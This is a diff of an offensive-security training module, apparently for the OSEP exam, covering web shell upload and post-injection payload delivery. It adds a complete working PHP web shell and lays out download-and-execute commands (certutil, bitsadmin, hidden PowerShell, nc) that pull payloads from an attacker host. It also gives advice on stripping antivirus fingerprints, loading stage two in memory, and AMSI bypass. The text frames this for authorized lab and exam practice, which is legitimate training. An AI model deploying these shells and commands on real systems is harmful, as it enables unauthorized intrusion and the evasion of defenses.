@@ -2,66 +2,41 @@
 For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
 :::
 
-# 10 · Web entry: ASPX web shells and post-injection download/execute
+# Web entry
 
-> **Covers scenarios:** 14, 15, 16
->
-> **Course basis:** chapters 8–9 (managed loading), chapter 24 (web and service accounts), C2/C6 (web entry)
->
-> **Prerequisites:** a web service that allows uploads or has an injection point; IIS/.NET (ASPX) or PHP/JSP runtime; a delivery address on the attacker box that the target can reach
+If the site parses an upload or you can inject OS commands, this is often the fastest landing. Keep stage one short — a minimal shell or a short download — and hand the heavy work to a replaceable stage two. After you land, `whoami /priv` first: `SeImpersonatePrivilege` on an app-pool account usually means you can escalate immediately ([Windows privilege escalation](/modules/06-uac-windows-privesc)).
 
-**Shared principles for this module**:
-1. **Web-entry identity is usually low-privileged** (IIS app-pool account, `NT AUTHORITY\NETWORK SERVICE`); the first thing to do after landing is `whoami /priv` — whether `SeImpersonatePrivilege` is present decides whether you can escalate immediately.
-2. **Public web shells always get killed** — trim yours down to the necessary function only, and keep stage 2 as an independently replaceable file.
-3. **Command length and quotes are silent killers** — injection points often truncate complex commands; a short stage 1 plus separate execution is almost always more reliable.
+## ASPX upload works, AV kills public shells
 
----
+If an uploaded ASPX is parsed, start with a minimal execution entry — public web shells get killed. If the uploaded EXE is also killed, load stage two in memory and stay inside `w3wp.exe`.
 
-## Scenario 14: The site allows ASPX upload, the back end is IIS, and the target has AV installed
+- [ ] Start the delivery server and watch the log
+- [ ] Upload the minimal ASPX (`m10-minimal-exec.aspx`) and confirm it executes
+- [ ] Confirm identity and privileges immediately
+- [ ] If AV kills the shell or an uploaded EXE, switch to the in-memory loader (`m10-managed-loader.aspx`)
+- [ ] If `SeImpersonatePrivilege` is present, go to module 06 — don’t start hunting a new upload point
 
-**Situation**: An uploaded ASPX is parsed by the server, so simple command execution works; but public web shells or uploaded EXEs get killed; the current identity is an app-pool account.
+Start the delivery server:
 
-**Assumptions**:
-- The upload directory is web-accessible and allows `.aspx` (or you can rename to `.ashx`/`.asmx`/`.config`).
-- The target has AV installed (signatures for files on disk and for common web-shell fingerprints).
-- Current identity is confirmed as an app-pool account (limited rights, but often carries `SeImpersonatePrivilege`).
+```bash
+python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads
+```
 
-**Prepare (attacker side)**:
-1. Prepare three artifacts:
-   | File | Purpose |
-   |---|---|
-   | `m10-minimal-exec.aspx` | Minimal execution entry (no UI, no extras) |
-   | `m10-managed-loader.aspx` | Load managed assemblies / execute in memory |
-   | `m10-jsp-shell.jsp` / `m10-php-shell.php` | Fallbacks for other runtimes |
-2. Make stage 2 a standalone file that is **independently replaceable** (so you do not re-upload the web shell every time you change it).
-3. Delivery service:
-   ```bash
-   python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads
-   ```
+Upload the minimal ASPX and confirm it executes:
 
-**Procedure**:
-1. Upload the minimal ASPX, request it once, and confirm it executes:
-   ```text
-   GET /upload/shell.aspx?cmd=whoami
-   ```
-2. Immediately confirm identity and privileges:
-   ```text
-   cmd=whoami /priv
-   cmd=whoami /groups
-   ```
-3. If AV kills it → strip the fingerprint: remove comments, drop `eval`, split or encode command keywords; or change the extension and path.
-4. If the uploaded EXE gets killed → switch to **in-memory loading**: the ASPX only `Assembly.Load`s the stage-2 bytes (Base64) into the IIS process — nothing lands on disk.
-5. Once execution is stable: if `SeImpersonatePrivilege` is present → go to [06-uac-windows-privesc](/modules/06-uac-windows-privesc) scenario 26.
+```text
+GET /upload/shell.aspx?cmd=whoami
+cmd=whoami /priv
+cmd=whoami /groups
+```
 
-**Scripts used**:
-| Script | Purpose | Key parameters |
-|---|---|---|
-| `m10-minimal-exec.aspx` | Minimal command execution | `cmd` parameter |
-| `m10-managed-loader.aspx` | In-memory load of managed assemblies | `b64` parameter |
-| `m10-jsp-shell.jsp` / `m10-php-shell.php` | Fallbacks for non-IIS environments | `cmd` |
-| `m10-download-fallbacks.md` | Downloader fallback matrix | — |
+A 200 with command output and an app-pool `whoami` means the page is parsed. `w3wp.exe` in `tasklist` means the ASPX is running inside the IIS worker.
 
-#### `m10-minimal-exec.aspx`
+If AV kills the ASPX, strip the fingerprint: remove comments, drop `eval`, split or encode command keywords, or change the extension and path (`.ashx` / `.asmx`, or a `.config` that triggers parsing). If the uploaded EXE is killed, switch to in-memory loading — the ASPX only `Assembly.Load`s the stage-two bytes (Base64) into the IIS process, nothing lands on disk. If uploads are restricted to an extension allowlist, find another upload point, a parsing flaw, or an injection point (the two sections below). If the app-pool account is too low-privileged and has no `SeImpersonatePrivilege`, hunt for other service accounts on the same server (IIS configuration, credentials in connection strings).
+
+For a non-IIS runtime, use the JSP or PHP fallbacks (`m10-jsp-shell.jsp` / `m10-php-shell.php`). Treat the web shell as an execution entry only — when something gets killed you swap stage two, not the upload point.
+
+::: details `m10-minimal-exec.aspx` · click to expand
 
 ````html
 <%@ Page Language="C#" AutoEventWireup="true" Debug="false" Trace="false" %>
@@ -119,7 +94,10 @@ Self-check notes (static checks when you have no IIS):
 --%>
 ````
 
-#### `m10-managed-loader.aspx`
+:::
+
+
+::: details `m10-managed-loader.aspx` · click to expand
 
 ````html
 <%@ Page Language="C#" AutoEventWireup="true" Debug="false" Trace="false" %>
@@ -278,7 +256,10 @@ Self-check notes (static checks when you have no IIS):
 --%>
 ````
 
-#### `m10-jsp-shell.jsp`
+:::
+
+
+::: details `m10-jsp-shell.jsp` · click to expand
 
 ````xml
 <%--
@@ -332,7 +313,99 @@ Self-check notes (static checks when you have no Tomcat):
 --%>
 ````
 
-#### `m00-delivery-server.py`
+:::
+
+
+::: details `m10-php-shell.php` · click to expand
+
+````php
+<?php
+/*
+Purpose: minimal PHP command-execution entry — covers LAMP / nginx+php-fpm / IIS+PHP; it picks
+      /bin/sh -c (Linux) or cmd /c (Windows) automatically from PHP_OS, and degrades through the command-execution functions as they are available.
+Scenario: fallback for 14 (a web entry exists but the runtime is PHP), 15/16 (you have injection/upload but need a stable long-command channel)
+Dependencies: PHP 5.4+; at least one of proc_open / shell_exec / exec / system / passthru / popen is not in disable_functions
+Usage:
+  1) Upload into a web-accessible directory (for example /var/www/html/shell.php)
+  2) Request: http://TARGET/shell.php?cmd=id
+  3) With no cmd parameter it returns "ready" (proof that PHP has parsed it and no WAF blocked it)
+Placeholders: TARGET=target site; cmd=command to run (URL-encode it)
+Test status: not tested on a target; passed a syntax check with php -l (use python3 tag-pairing checks when you have no PHP environment)
+*/
+
+if (!isset($_REQUEST['cmd']) || trim($_REQUEST['cmd']) === '') {
+    header('Content-Type: text/plain; charset=UTF-8');
+    echo "ready";
+    exit;
+}
+
+$cmd = $_REQUEST['cmd'];
+header('Content-Type: text/plain; charset=UTF-8');
+
+$is_win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
+
+if (function_exists('proc_open')) {
+    if ($is_win) {
+        $argv = $cmd;
+    } else {
+        $argv = '/bin/sh -c ' . escapeshellarg($cmd);
+    }
+    $desc = array(
+        1 => array('pipe', 'w'),
+        2 => array('pipe', 'w'),
+    );
+    $proc = proc_open($argv, $desc, $pipes);
+    if (is_resource($proc)) {
+        echo stream_get_contents($pipes[1]);
+        echo stream_get_contents($pipes[2]);
+        fclose($pipes[1]);
+        fclose($pipes[2]);
+        proc_close($proc);
+        exit;
+    }
+}
+
+if (function_exists('shell_exec')) {
+    echo shell_exec($cmd);
+    exit;
+}
+
+if (function_exists('exec')) {
+    $out = array();
+    $code = 0;
+    exec($cmd, $out, $code);
+    echo implode("\n", $out);
+    exit;
+}
+
+if (function_exists('system')) {
+    system($cmd);
+    exit;
+}
+
+if (function_exists('passthru')) {
+    passthru($cmd);
+    exit;
+}
+
+if (function_exists('popen')) {
+    $h = popen($cmd, 'r');
+    if (is_resource($h)) {
+        while (!feof($h)) {
+            echo fread($h, 4096);
+        }
+        pclose($h);
+        exit;
+    }
+}
+
+echo "no command execution function available (check disable_functions)";
+````
+
+:::
+
+
+::: details `m00-delivery-server.py` · click to expand
 
 ````python
 #!/usr/bin/env python3
@@ -487,7 +560,47 @@ if __name__ == "__main__":
     sys.exit(main())
 ````
 
-#### `m10-download-fallbacks.md`
+:::
+
+
+## Command execution works, the downloader is blocked
+
+If you can already run OS commands through injection (`xp_cmdshell` or equivalent) but one download tool fails, you need a transport fallback — not a new injection.
+
+- [ ] Confirm egress first (a hit in the delivery log means the tool can talk out)
+- [ ] Try the downloaders in matrix order, changing only one variable at a time
+- [ ] After the download, hash-verify before you execute
+- [ ] If execution is blocked, go to the AV / AMSI handling in [module 05](/modules/05-applocker-clm-amsi)
+
+Confirm egress:
+
+```text
+curl -s -o nul http://<LHOST>/ping
+```
+
+Downloader order (Windows). When one is blocked, move down the list:
+
+| Priority | Tool | Command template | Notes |
+|---|---|---|---|
+| 1 | `curl` | `curl -o C:\Windows\Temp\p.exe http://LHOST/p.exe` | Built into Win10+, available most often |
+| 2 | `certutil` | `certutil -urlcache -split -f http://LHOST/p.exe C:\Windows\Temp\p.exe` | The classic; often blocked by policy |
+| 3 | `bitsadmin` | `bitsadmin /transfer j /download /priority normal http://LHOST/p.exe C:\Windows\Temp\p.exe` | Goes through the BITS service |
+| 4 | PowerShell | `powershell -nop -w hidden -c "IWR -Uri http://LHOST/p.exe -OutFile C:\Windows\Temp\p.exe"` | Watch AMSI |
+| 5 | `wget`/`nc` | `nc LHOST 80 > p.exe` (needs interaction) | Last resort |
+
+After the download, verify — or you will waste time chasing a false success:
+
+```cmd
+certutil -hashfile C:\Windows\Temp\p.exe MD5
+```
+
+A request from the target IP in the delivery log plus a matching hash means the file is really there. Then execute.
+
+If every downloader is blocked, switch to an upload channel (web shell / upload point) or embed Base64 and write it in chunks. If only specific domains may egress, domain fronting / proxy ([egress channels](/modules/09-c2-egress-channels)). If the command is escaped or truncated, switch to a shorter command (next section). If the PowerShell downloader is blocked by AMSI, prepend a handler (`m05-amsi-bypass-variants.ps1`, variants 1→4, one at a time).
+
+A failed downloader does not mean the network is down — read the delivery log first and separate “no request was made” (the tool is blocked) from “it requested but nothing came back” (a network / proxy problem).
+
+::: details `m10-download-fallbacks.md` · click to expand
 
 ````markdown
 # Downloader fallback matrix (scenarios 15 / 16 / 17)
@@ -593,214 +706,10 @@ Compare with `md5sum ~/osep/payloads/PAYLOAD` on the attacker box: a hash mismat
 | `m09-https-listener.sh` | Start a TLS listener when delivery needs HTTPS |
 ````
 
-**Validation**: HTTP 200 with command output; `whoami` shows an app-pool account; `w3wp.exe` appears in `tasklist` (the ASPX runs inside the w3wp process).
+:::
 
-**Failure branches and alternatives**:
-1. **ASPX killed** → strip and encode it; or switch to `.ashx`/`.asmx`; or upload a `.config` to trigger parsing (depends on the environment).
-2. **EXE killed** → load it in memory (`Assembly.Load`), or use PowerShell reflection (if w3wp allows it).
-3. **Uploads restricted** (extension allowlist) → find another upload point, a parsing flaw, or an injection point (scenarios 15/16).
-4. **The app-pool account is too low-privileged and has no SeImpersonate** → hunt for other service accounts on the same server (IIS configuration, credentials in connection strings).
 
-**Exam / OPSEC notes**: treat the web shell as an execution entry only and hand all the heavy work to an independent stage 2; then every time something gets killed you only swap one file instead of hunting for another upload point.
-
----
-
-## Scenario 15: A classic ASP site has SQL injection and can run OS commands, but the downloader is blocked
-
-**Situation**: You already have command execution through the database, but one system download tool fails while another can download the same file. → What you need is a **transport fallback route**, not a new injection tool.
-
-**Assumptions**:
-- You can already run OS commands through the injection point (`xp_cmdshell` or equivalent).
-- The target has egress, but some download tools are blocked by application control / AV / a proxy.
-- You already have a validated EXE/script as stage 2.
-
-**Prepare (attacker side)**: prepare the downloader fallback matrix (`m10-download-fallbacks.md`)
-
-| Priority | Tool | Command template | Notes |
-|---|---|---|---|
-| 1 | `curl` | `curl -o C:\Windows\Temp\p.exe http://LHOST/p.exe` | Built into Win10+, available most often |
-| 2 | `certutil` | `certutil -urlcache -split -f http://LHOST/p.exe C:\Windows\Temp\p.exe` | The classic; often blocked by policy |
-| 3 | `bitsadmin` | `bitsadmin /transfer j /download /priority normal http://LHOST/p.exe C:\Windows\Temp\p.exe` | Goes through the BITS service |
-| 4 | PowerShell | `powershell -nop -w hidden -c "IWR -Uri http://LHOST/p.exe -OutFile C:\Windows\Temp\p.exe"` | Watch AMSI |
-| 5 | `wget`/`nc` | `nc LHOST 80 > p.exe` (needs interaction) | Last resort |
-
-**Procedure**:
-1. Confirm egress first: from the injection point run `curl -s -o nul http://LHOST/ping` (a hit in your delivery log means success).
-2. Try the downloaders in matrix order, switching one at a time, **changing only one variable**.
-3. After the download, verify: `certutil -hashfile C:\Windows\Temp\p.exe MD5` must match the attacker box.
-4. Then execute; if execution is blocked → go to the AV-evasion / behavioural handling in scenarios 18/19 of `docs/05`.
-
-**Scripts used**:
-| Script | Purpose | Key parameters |
-|---|---|---|
-| `m10-download-fallbacks.md` | Downloader fallback matrix and commands | LHOST/URL |
-| `m10-minimal-exec.aspx` | Alternate execution channel when you have a web shell | `cmd` |
-
-**Validation**: a request from the target IP appears in the delivery service log; the file exists on the target with a matching hash; there is a callback or output after execution.
-
-**Failure branches and alternatives**:
-1. **Every downloader is blocked** → switch to an "upload" channel (web shell / upload point) or embed Base64 and write it in chunks.
-2. **Only specific domains may egress** → domain fronting / proxy ([09-c2-egress-channels](/modules/09-c2-egress-channels)).
-3. **The command is escaped/truncated** → switch to a shorter command (scenario 16).
-
-**Exam / OPSEC notes**: a failed downloader **does not mean the network is down** — read the delivery log first and separate "no request was made" (the tool is blocked) from "it requested but nothing came back" (a network/proxy problem).
-
----
-
-## Scenario 16: Web command injection only accepts very short commands
-
-**Situation**: An internal page offers ping and similar features and is command-injectable, but the argument length is limited — complex quotes and nested commands are easily truncated.
-
-**Assumptions**:
-- The injection point exists, but length and character set are limited (often <100 characters).
-- The target has egress (otherwise fall back to embedding).
-
-**Prepare (attacker side)**:
-1. Prepare an **extremely short stage 1** (replace long commands with "download a script, then run it"):
-   ```text
-   # download only first (~40 characters)
-   certutil -urlcache -f http://LHOST/a a
-   # then execute
-   a
-   ```
-2. Prepare encoded-argument variants suited to the target interpreter (pass Base64; avoid quotes).
-3. Put the stage-2 script in place in advance, with the shortest possible filename (`a`, `b`).
-
-**Procedure**:
-1. Measure the length ceiling first: grow a harmless command (`echo AAAA...`) step by step to find the boundary.
-2. Use the two-step "download + execute" pattern: the first step only writes the file, the second only executes it.
-3. Confirm every step through the delivery log (did the target really issue the request).
-4. If quotes get truncated → switch to Base64/hex arguments, or write the content into a file and then execute that.
-5. If that is still not enough → concatenate several chunks with redirection (`>a`, `>>a`), writing them over multiple requests.
-
-**Scripts used**:
-| Script | Purpose | Key parameters |
-|---|---|---|
-| `m10-download-fallbacks.md` | Short-command download templates | LHOST |
-| `m10-minimal-exec.aspx` | Long-command channel when you have a web shell | `cmd` |
-
-**Validation**: requests appear in the delivery log in order; the file exists on the target; there is a callback or output after execution.
-
-**Failure branches and alternatives**:
-1. **The two-step is still truncated** → use a shorter downloader (`bitsadmin /transfer` is long too; prefer `curl -o a http://LHOST/a`).
-2. **The target has no egress** → embed Base64 (but length is limited, so you need multi-chunk concatenation).
-3. **The injection point filters keywords** (`curl`/`certutil` are filtered) → switch to an equivalent tool or encoded arguments.
-
-**Exam / OPSEC notes**: spend two minutes measuring the length ceiling — far faster than guessing over and over; the shorter the filename, the better.
-
----
-
-## Module quick-reference notes
-
-| Goal | Command / key point |
-|---|---|
-| Minimal ASPX execution | `m10-minimal-exec.aspx` (add `?cmd=whoami` when you request it) |
-| Load stage 2 in memory | `m10-managed-loader.aspx?b64=...` |
-| Identity and privileges | `whoami /priv` (watch for SeImpersonatePrivilege) |
-| Downloader fallback order | curl → certutil → bitsadmin → PowerShell → nc |
-| Hash verification | `certutil -hashfile p.exe MD5` |
-| Command length limited | short stage 1 + separate download and execute |
-| Killed by AV | strip the fingerprint / encode / change extension / load in memory |
-
-## Related scripts
-
-| Script | Notes |
-|---|---|
-| `m10-minimal-exec.aspx` | Minimal execution entry |
-| `m10-managed-loader.aspx` | Managed assembly loading |
-| `m10-jsp-shell.jsp` | JSP fallback |
-| `m10-php-shell.php` | PHP fallback |
-| `m10-download-fallbacks.md` | Downloader fallback matrix |
-| `m05-amsi-bypass-variants.ps1` | AMSI handling for PowerShell downloads |
-| `m00-delivery-server.py` | Delivery and request logging |
-
-#### `m10-php-shell.php`
-
-````php
-<?php
-/*
-Purpose: minimal PHP command-execution entry — covers LAMP / nginx+php-fpm / IIS+PHP; it picks
-      /bin/sh -c (Linux) or cmd /c (Windows) automatically from PHP_OS, and degrades through the command-execution functions as they are available.
-Scenario: fallback for 14 (a web entry exists but the runtime is PHP), 15/16 (you have injection/upload but need a stable long-command channel)
-Dependencies: PHP 5.4+; at least one of proc_open / shell_exec / exec / system / passthru / popen is not in disable_functions
-Usage:
-  1) Upload into a web-accessible directory (for example /var/www/html/shell.php)
-  2) Request: http://TARGET/shell.php?cmd=id
-  3) With no cmd parameter it returns "ready" (proof that PHP has parsed it and no WAF blocked it)
-Placeholders: TARGET=target site; cmd=command to run (URL-encode it)
-Test status: not tested on a target; passed a syntax check with php -l (use python3 tag-pairing checks when you have no PHP environment)
-*/
-
-if (!isset($_REQUEST['cmd']) || trim($_REQUEST['cmd']) === '') {
-    header('Content-Type: text/plain; charset=UTF-8');
-    echo "ready";
-    exit;
-}
-
-$cmd = $_REQUEST['cmd'];
-header('Content-Type: text/plain; charset=UTF-8');
-
-$is_win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
-
-if (function_exists('proc_open')) {
-    if ($is_win) {
-        $argv = $cmd;
-    } else {
-        $argv = '/bin/sh -c ' . escapeshellarg($cmd);
-    }
-    $desc = array(
-        1 => array('pipe', 'w'),
-        2 => array('pipe', 'w'),
-    );
-    $proc = proc_open($argv, $desc, $pipes);
-    if (is_resource($proc)) {
-        echo stream_get_contents($pipes[1]);
-        echo stream_get_contents($pipes[2]);
-        fclose($pipes[1]);
-        fclose($pipes[2]);
-        proc_close($proc);
-        exit;
-    }
-}
-
-if (function_exists('shell_exec')) {
-    echo shell_exec($cmd);
-    exit;
-}
-
-if (function_exists('exec')) {
-    $out = array();
-    $code = 0;
-    exec($cmd, $out, $code);
-    echo implode("\n", $out);
-    exit;
-}
-
-if (function_exists('system')) {
-    system($cmd);
-    exit;
-}
-
-if (function_exists('passthru')) {
-    passthru($cmd);
-    exit;
-}
-
-if (function_exists('popen')) {
-    $h = popen($cmd, 'r');
-    if (is_resource($h)) {
-        while (!feof($h)) {
-            echo fread($h, 4096);
-        }
-        pclose($h);
-        exit;
-    }
-}
-
-echo "no command execution function available (check disable_functions)";
-````
-
-#### `m05-amsi-bypass-variants.ps1`
+::: details `m05-amsi-bypass-variants.ps1` · click to expand
 
 ````powershell
 <#
@@ -930,3 +839,43 @@ if ($ProbeOnly) {
 }
 ````
 
+:::
+
+
+## Injection only accepts short commands
+
+If the injection point exists but length and character set are limited (often <100 characters), measure the ceiling first, then use a two-step “download, then execute” — do not try to land a nested one-liner.
+
+- [ ] Grow a harmless command (`echo AAAA...`) until it truncates, and note the boundary
+- [ ] Put stage two in place with the shortest possible filename (`a`, `b`)
+- [ ] First request only writes the file; second request only executes it
+- [ ] Confirm every step in the delivery log
+
+Extremely short stage one:
+
+```text
+# download only first (~40 characters)
+certutil -urlcache -f http://LHOST/a a
+# then execute
+a
+```
+
+If quotes get truncated, switch to Base64/hex arguments, or write the content into a file and then execute that. If that is still not enough, concatenate several chunks with redirection (`>a`, `>>a`) over multiple requests.
+
+If the two-step is still truncated, use a shorter downloader (`bitsadmin /transfer` is long too; prefer `curl -o a http://LHOST/a`). If the target has no egress, embed Base64 (length is limited, so you need multi-chunk concatenation). If the injection point filters keywords (`curl`/`certutil`), switch to an equivalent tool or encoded arguments.
+
+Spend two minutes measuring the length ceiling — far faster than guessing. The shorter the filename, the better. When you have a web shell, use it as the long-command channel (`m10-minimal-exec.aspx?cmd=`).
+
+## Cheat sheet
+
+| You want to… | Use |
+|---|---|
+| Minimal ASPX execution | `m10-minimal-exec.aspx?cmd=whoami` |
+| Load stage two in memory | `m10-managed-loader.aspx?b64=...` |
+| Non-IIS fallback | `m10-jsp-shell.jsp` / `m10-php-shell.php` |
+| Identity and privileges | `whoami /priv` (watch for `SeImpersonatePrivilege`) |
+| Downloader fallback order | curl → certutil → bitsadmin → PowerShell → nc |
+| Hash verification | `certutil -hashfile p.exe MD5` |
+| Command length limited | short stage 1; download and execute separately |
+| Killed by AV | strip the fingerprint / encode / change extension / load in memory |
+| PowerShell download blocked by AMSI | `m05-amsi-bypass-variants.ps1` |
